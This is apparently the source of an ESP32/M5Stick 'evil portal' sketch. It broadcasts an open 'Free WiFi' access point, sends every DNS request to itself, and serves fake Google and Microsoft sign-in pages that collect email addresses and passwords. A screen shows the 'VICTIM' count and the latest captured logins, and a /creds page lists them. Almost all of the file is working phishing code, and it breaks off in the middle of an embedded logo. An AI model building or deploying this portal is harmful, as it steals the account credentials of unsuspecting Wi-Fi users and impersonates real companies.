// Based on https://github.com/n0xa/M5Stick-Stuph/blob/main/CaptPort/CaptPort.ino
//      and https://github.com/marivaaldo/evil-portal-m5stack

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

//#define M5STICK_C_PLUS
#define M5STICK_C_PLUS_2
//#define M5CARDPUTER

#if defined(M5STICK_C_PLUS) && defined(M5STICK_C_PLUS_2) && defined(M5CARDPUTER)
#error "Please define only one platform: M5STICK_C_PLUS, M5STICK_C_PLUS_2 or M5CARDPUTER"
#endif

#if defined(M5STICK_C_PLUS)
#include <M5StickCPlus.h>
#elif defined(M5STICK_C_PLUS_2)
#include <M5StickCPlus2.h>
#elif defined(M5CARDPUTER)
#include <M5Cardputer.h>
#endif

#include "fonts.h"
#include "logo.h"

#if defined(M5STICK_C_PLUS)
#define DISPLAY M5.Lcd
#define SPEAKER M5.Beep
#define HAS_LED 10  // Number is equivalent to GPIO
#define GPIO_LED 10
// #define HAS_SDCARD
#define SD_CLK_PIN 0
#define SD_MISO_PIN 36  //25
#define SD_MOSI_PIN 26
// #define SD_CS_PIN
#define M5_BUTTON_HOME 37
#define AXP
TFT_eSprite spr = TFT_eSprite(&M5.Lcd);
#endif

#if defined(M5STICK_C_PLUS_2)
#define DISPLAY M5.Lcd
#define SPEAKER M5.Speaker
#define HAS_LED 19  // Number is equivalent to GPIO
#define GPIO_LED 19
// #define HAS_SDCARD
#define SD_CLK_PIN 0
#define SD_MISO_PIN 36  //25
#define SD_MOSI_PIN 26
// #define SD_CS_PIN
#define M5_BUTTON_HOME 37
#define PWRMGMT
#define BACKLIGHT 27
#define MINBRIGHT 120
LGFX_Sprite spr = LGFX_Sprite(&M5.Lcd);
#endif

#if defined(M5CARDPUTER)
#define DISPLAY M5Cardputer.Display
#define SPEAKER M5Cardputer.Speaker
#define KB M5Cardputer.Keyboard
#define HAS_SDCARD
#define SD_CLK_PIN 40
#define SD_MISO_PIN 39
#define SD_MOSI_PIN 14
#define SD_CS_PIN 12
#define PWRMGMT
#define BACKLIGHT 38
#define MINBRIGHT 165
LGFX_Sprite spr = LGFX_Sprite(&M5.Lcd);
#endif

#if defined(HAS_SDCARD)
#include <FS.h>
#include <SD.h>
#include <SPI.h>
#endif

#define DEFAULT_AP_SSID_NAME "Free WiFi"
#define SD_CREDS_PATH "/evil-portal-creds.txt"
// #define LANGUAGE_EN_US
#define LANGUAGE_PT_BR

#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR)
#error "Please define only one language: LANGUAGE_EN_US or LANGUAGE_PT_BR"
#endif

#if defined(LANGUAGE_EN_US)
#define LOGIN_TITLE "Sign in"
#define SELECT_MESSAGE "Select your E-mail Account Provider"
#define LOGIN_SUBTITLE "Use your {provider} Account"
#define LOGIN_EMAIL_PLACEHOLDER "Email"
#define LOGIN_PASSWORD_PLACEHOLDER "Password"
#define LOGIN_MESSAGE "Please log in to browse securely."
#define LOGIN_BUTTON "Next"
#define LOGIN_AFTER_MESSAGE "Please wait a few minutes. Soon you will be able to access the internet."
#elif defined(LANGUAGE_PT_BR)
#define LOGIN_TITLE "Fazer login"
#define SELECT_MESSAGE "Selecione sua plataforma de e-mail"
#define LOGIN_SUBTITLE "Use sua Conta {provider}"
#define LOGIN_EMAIL_PLACEHOLDER "E-mail"
#define LOGIN_PASSWORD_PLACEHOLDER "Senha"
#define LOGIN_MESSAGE "Por favor, faça login para navegar de forma segura."
#define LOGIN_BUTTON "Avançar"
#define LOGIN_AFTER_MESSAGE "Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet."
#endif


// -=-=-=-=-=- LIST OF CURRENTLY DEFINED FEATURES -=-=-=-=-=-
// AXP        - AXP192 Power Management exposed as M5.Axp
// PWRMGMT    - StickC+2 Power Management exposed as M5.Power
// KB         - Keyboard exposed as M5Cardputer.Keyboard
// BACKLIGHT  - Alias to the pin used for the backlight on some models
// MINBRIGHT  - The lowest number (0-255) for the backlight to show through

int totalCapturedCredentials = 0;
int previousTotalCapturedCredentials = -1;  // stupid hack but wtfe
String capturedCredentialsHtml = "";
bool sdcardMounted = false;
String hr,mi,se;

int cp1,cp2;
String last_auth_prov[4]={"", "", "", ""};
int last_auth_idx[4]={0, 0, 0, 0};
String last_auth_username[4]={"", "", "", ""};
String last_auth_pass[4]={"", "", "", ""};

#define color 0x01EA
#define color2 ORANGE

String apSsidName = String(DEFAULT_AP_SSID_NAME);

#if defined(HAS_SDCARD)
SPIClass* sdcardSPI = NULL;
SemaphoreHandle_t sdcardSemaphore;
#endif

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const int TICK_TIMER = 500;
const int SCREEN_TIMER = 180 * 1000;
const int DIM_TIMER = 20 * 1000;
IPAddress AP_GATEWAY(172, 0, 0, 1);  // Gateway
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
int screen_dim_current = 0;
byte led_status = HIGH;

DNSServer dnsServer;
WebServer webServer(80);

int ConvertRGB( byte R, byte G, byte B)
{
  return ( ((R & 0xF8) << 8) | ((G & 0xFC) << 3) | (B >> 3) );
}

void setup() {
  setupDeviceSettings();
  setupWiFi();
  setupWebServer();
  setupSdCard();

  #if defined(M5STICK_C_PLUS_2)
       StickCP2.Rtc.setDateTime( { { 1970, 1, 1 }, { 0, 0, 0 } } );
  #else
    RTC_TimeTypeDef TimeStruct;
    TimeStruct.Hours   = 0;
    TimeStruct.Minutes = 0;
    TimeStruct.Seconds = 0;
    M5.Rtc.SetTime(&TimeStruct);
  #endif

  bootTime = lastActivity = millis();
}

void setupDeviceSettings() {
  Serial.begin(115200);
  while (!Serial && millis() < 1000)
    ;

#if defined(M5STICK_C_PLUS) || defined(M5STICK_C_PLUS_2)
  M5.begin();
  DISPLAY.setRotation(0);
#elif defined(M5CARDPUTER)
  M5Cardputer.begin();
  DISPLAY.setRotation(1);
#endif

#if defined(HAS_LED)
  pinMode(GPIO_LED, OUTPUT);
  digitalWrite(GPIO_LED, HIGH);
#endif

  DISPLAY.fillScreen(BLACK);
  DISPLAY.setSwapBytes(true);
  DISPLAY.setTextSize(2);
  spr.createSprite(135,240);
}


bool setupSdCard() {
#if defined(HAS_SDCARD)
  sdcardSemaphore = xSemaphoreCreateMutex();
  sdcardSPI = new SPIClass(FSPI);
  sdcardSPI->begin(SD_CLK_PIN, SD_MISO_PIN, SD_MOSI_PIN, SD_CS_PIN);

  delay(10);

  if (!SD.begin(SD_CS_PIN, *sdcardSPI)) {
    Serial.println("Failed to mount SDCARD");
    return false;
  } else {
    Serial.println("SDCARD mounted successfully");
    sdcardMounted = true;
    return true;
  }
#else
  return true;
#endif
}

void setupWiFi() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apSsidName);
}

void setupWebServer() {
  dnsServer.start(DNS_PORT, "*", AP_GATEWAY);  // DNS spoofing (Only HTTP)

  webServer.on("/post", []() {

    webServer.send(HTTP_CODE, "text/html", index_POST());

#if defined(M5STICK_C_PLUS)
    SPEAKER.tone(4000);
#elif defined(M5CARDPUTER) || defined(M5STICK_C_PLUS_2)
      SPEAKER.tone(4000, 50);
#endif

    printScreen();

    delay(50);

#if defined(M5STICK_C_PLUS)
    SPEAKER.mute();
#endif

#if defined(HAS_LED)
    blinkLed();
#endif
  });

  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds_GET());
  });

  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear_GET());
  });

  webServer.on("/google", []() {
    webServer.send(HTTP_CODE, "text/html", provider_GET("google"));
  });

  webServer.on("/microsoft", []() {
    webServer.send(HTTP_CODE, "text/html", provider_GET("msft"));
  });

  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index_GET());
  });

  webServer.begin();
}

void loop() {
  bool show_display = 1;
  int diff = (millis() - lastTick);
  bool pressed = check_select_press();
  if (pressed) lastActivity = millis();
  if ((diff > TICK_TIMER) || pressed) {
    if (((millis() - lastActivity) > SCREEN_TIMER) and (!pressed)) show_display = 0;

    lastTick = millis();
    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
      previousTotalCapturedCredentials = totalCapturedCredentials;
      show_display = 1;
    }

    if (led_status == HIGH) {
      led_status = LOW;
    }else{
      led_status = HIGH;
    }
    digitalWrite(GPIO_LED, led_status);

  }

  if (show_display == 1){
    printScreen();
  }else{
    spr.fillSprite(TFT_BLACK);
  }

  dnsServer.processNextRequest();
  webServer.handleClient();
}

bool check_select_press(){
#if defined(KB)
  M5Cardputer.update();
  if (KB.isKeyPressed(KEY_ENTER) || KB.isKeyPressed('/')){
    dimtimer();
    return true;
  }
#else
  if (digitalRead(M5_BUTTON_HOME) == LOW){
    return true;
  }
#endif
  return false;
}

void printScreen() {

  int h, m, s;
  #if defined(M5STICK_C_PLUS_2)
      auto dt = StickCP2.Rtc.getDateTime();
      h = dt.time.hours;
      m = dt.time.minutes;
      s = dt.time.seconds;
    #else
      M5.Rtc.GetBm8563Time();
      h = M5.Rtc.Hour;
      m = M5.Rtc.Minute;
      s = M5.Rtc.Second;
    #endif
 
  if(h<10) hr="0"+String(h); else hr=String(h);
  if(m<10) mi="0"+String(m); else mi=String(m);
  if(s<10) se="0"+String(s); else se=String(s);

  spr.fillSprite(TFT_BLACK);
 
  drawBatteryBar();

  // Draw graphics first
  spr.drawFastHLine(10, 144, 35, color2);
  spr.drawFastVLine(45, 144, 64, color2);
  spr.drawFastVLine(46, 144, 64, color2);
  spr.drawFastHLine(45, 208, 79, color2);

  spr.pushImage(10,148,30,39,logo);

  spr.setTextFont(0);
  spr.setTextColor(ConvertRGB(75,143,190),BLACK);
  spr.drawString("TIME:",12,200);
  
  //spr.drawString("TEMP:",12,150);
  //spr.drawString(String(temp),12,160);
  
  spr.setTextDatum(4);
  spr.fillRoundRect(10, 72, 55,46,4,color);
  spr.fillRoundRect(70, 72, 55,46,4,color);
  spr.fillRoundRect(10, 122, 115, 17, 0, 0x0083);
  
  // Draw texts

  spr.setTextDatum(0);
  spr.setTextColor(WHITE,BLACK);
  spr.drawString("VICTIM",10,8,2);
  spr.setFreeFont(&DSEG7_Classic_Bold_32);
  spr.drawString(String(cp1 + cp2),10,30);

  spr.setTextColor(WHITE,0x0083);
  spr.drawString("LAST AUTH",13,122,2);

  spr.setTextColor(WHITE,BLACK);
  spr.setFreeFont(&DSEG7_Classic_Bold_17);
  spr.drawString(hr+":"+mi,10,216);
  spr.setFreeFont(&DSEG7_Classic_Bold_12);
  spr.drawString(se,76,216);
  
  byte auth_empty = 1;
  for(int i=0;i<4;i++){

    if (last_auth_idx[i] > 0){
      auth_empty = 0;
      spr.setTextColor(0x7765,BLACK);
      String idx = "";
      
      int c = last_auth_idx[i];
      if (c >= 100) idx = String(c) + ":";
      else if (c >= 10) idx = " "+ String(c) + ":";
      else idx = "  " + String(c) + ":";
      spr.drawString(idx,53,142+(i*15),2);

      spr.setTextColor(WHITE,BLACK);
      spr.drawString(last_auth_prov[i],83,142+(i*15),2);
    }

  }

  if (auth_empty == 1){
    spr.setTextColor(ConvertRGB(170,0,0),BLACK);
    spr.drawString("EMPTY",70,167,2);
  }
  
  //spr.fillCircle(62,150+(chosen*15),4,TFT_RED);
  
  spr.setTextDatum(4);
  spr.setTextColor(WHITE,color);
  spr.drawString("MSFT",14,82,2);
  spr.drawString("GOOGLE",74,82,2);
  spr.setFreeFont(&DSEG7_Classic_Bold_17);
  spr.drawString(String(cp1),17,102);
  spr.drawString(String(cp2),77,102);

  spr.setTextDatum(0);
  spr.pushSprite(0,0); 

  int diff = (millis() - lastActivity);
  if (diff > DIM_TIMER) {
    if (screen_dim_current > 0){
      if (diff > DIM_TIMER * 6) {
        screenBrightness(0);
      }else if (diff > DIM_TIMER * 2) {
        screenBrightness(30);
      }else{
        screenBrightness(60);
      }
    }
  }else{
    screenBrightness(100);
  }

}

void screenBrightness(int bright){
  if (bright < 0) bright = 0;
  if (bright > 100) bright = 100;
  if (bright == screen_dim_current) return;
  //Serial.printf("Brightness: %d\n", bright);
  #if defined(AXP)
    M5.Axp.ScreenBreath(bright);
  #endif
  #if defined(BACKLIGHT)
    int bl = MINBRIGHT + round(((255 - MINBRIGHT) * bright / 100)); 
    analogWrite(BACKLIGHT, bl);
  #endif
  screen_dim_current = bright;
}

void drawBatteryBar(){

  // Batery Level
  for(int i=0;i<5;i++)
  spr.fillRect(100+(i*6),10,4,12,color);

  int battery = 0;
  #if defined(PWRMGMT)
    battery = M5.Power.getBatteryLevel();
  #endif

  #ifdef defined(AXP)
    float b = M5.Axp.GetVbatData() * 1.1 / 1000;
    battery = ((b - 3.0) / 1.2) * 100;
  #endif

  uint16_t batteryBarColor = BLUE;
  if(battery < 40) {
    batteryBarColor = ConvertRGB(170,0,0);
  } else if(battery < 60) {
    batteryBarColor = ConvertRGB(238,138,17);
  } else {
    batteryBarColor = ConvertRGB(0,135,67);
  }
  int batG = (battery / 20);
  for(int i=0;i<batG;i++)
  spr.fillRect(100+(i*6),10,4,12,batteryBarColor);

  //spr.setTextDatum(0);
  //spr.setTextColor(WHITE,0x0083);
  //spr.setFreeFont(&DSEG7_Classic_Bold_32);
  //spr.drawString(String(battery) + "%",100,30, 2);

}

String getInputValue(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String getHtmlContents(String body, String provider) {

  if (provider.isEmpty()) provider = "Google";

  provider.toLowerCase();
  String logo = "";
  if ((provider == "microsoft") || (provider == "msft")){
    provider = "msft";
    logo = "<svg viewBox='0 0 108 24' width='108' height='24' xmlns='http://www.w3.org/2000/svg'><path d='M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z' fill='#737373'/><rect width='10.931' height='10.931' fill='#f25022'/><rect x='12.069' width='10.931' height='10.931' fill='#7fba00'/><rect y='12.069' width='10.931' height='10.931' fill='#00a4ef'/><rect x='12.069' y='12.069' width='10.931' height='10.931' fill='#ffb900'/></svg>";
  }else{
    logo = "<svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true' class='BFr46e xduoyf'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg>";
  }

  String html =
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "  <title>"
    + apSsidName + "</title>"
                   "  <meta charset='UTF-8'>"
                   "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                   "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ padding-top: 25px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
                   "</head>"
                   "<body>"
                   "  <div class='container'>"
                   "    <div class='logo-container'>"
                   "      <?xml version='1.0' standalone='no'?>"
                   "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
                   "    </div>"
                   "    <div class=form-container>"
                   "      <center>"
                   "        <div class='containerlogo'>"+ logo + "</div>"
                   "      </center>"
                   "      <div style='min-height: 150px'>"
    + body + "      </div>"
             "    </div>"
             "  </div>"
             "</body>"
             "</html>";
  return html;
}

String creds_GET() {
  return getHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>", "");
}


String index_GET() {

  String loginTitle = String(LOGIN_TITLE);
  String loginSubTitle = String(SELECT_MESSAGE);

  String html =
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "  <title>"
    + apSsidName + "</title>"
                   "  <meta charset='UTF-8'>"
                   "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                   "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} .container{ margin: auto; padding: 20px;} .logo-container{  margin-bottom: 30px; display: flex; text-align: center; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo:first-child { margin-right: 20px; } .containerlogo{ padding: 10px; width: 45%; min-height: 110; float: left; display: flex; text-align: center; justify-content: center; align-items: center; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
                   "</head>"
                   "<body>"
                   "  <div class='container'>"
                   "    <div class='logo-container'>"
                   "      <?xml version='1.0' standalone='no'?>"
                   "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
                   "    </div>"
                   "    <div class=form-container>"
                   "      <div style='min-height: 100px'>"
                   "       <center><div class='containertitle'>" + loginTitle + "</div><div class='containersubtitle'>" + loginSubTitle +  "</div></center>"
                   "     </div>"
                   "     <div style='min-height: 150px;'>"
                   "       <button type='button' style='background: transparent' class='containerlogo' onclick='javascript:location.href=\"/microsoft\"'>"
                   "         <svg viewBox='0 0 108 24' width='108' height='24' xmlns='http://www.w3.org/2000/svg'><path d='M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6